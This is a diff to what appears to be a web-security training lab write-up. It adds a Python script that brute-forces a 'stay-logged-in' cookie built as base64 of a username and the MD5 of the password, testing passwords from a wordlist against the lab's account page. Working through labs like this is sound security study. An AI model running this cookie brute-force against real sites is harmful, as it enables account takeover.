@@ -88,4 +88,40 @@ rm -f response.html
 
 ![image](https://github.com/user-attachments/assets/85a88dd5-f401-461b-ac25-50e923e6b576)
 
+Also we can use a python script:
+```python
+import hashlib
+import base64
+import requests
+
+
+url = "https://0ab0002f0464a5ec85691deb009200d8.web-security-academy.net/my-account"
+password_file = "passwords.txt"
+user = "carlos"
+
+try:
+    with open(password_file, 'r') as file:
+        passwords = file.readlines()
+except FileNotFoundError:
+    print(f"Error: The file '{password_file}' does not exist.")
+    exit(1)
+
+def generate_encoded_value(password):
+    md5_hash = hashlib.md5(password.encode()).hexdigest()
+    encoded_value = base64.b64encode(f"{user}:{md5_hash}".encode()).decode()
+    return encoded_value
+
+
+for password in passwords:
+    password = password.strip()  
+    encoded_value = generate_encoded_value(password)
+    cookies = {"stay-logged-in": encoded_value, "Session": ""}
+    response = requests.get(url, cookies=cookies, params={"id": user})
+
+    if response.status_code == 200:
+        print(f"\nPassword: {password}")
+        print(f"Cookie stay-logged-in: {encoded_value}")
+        break
+```
+
 
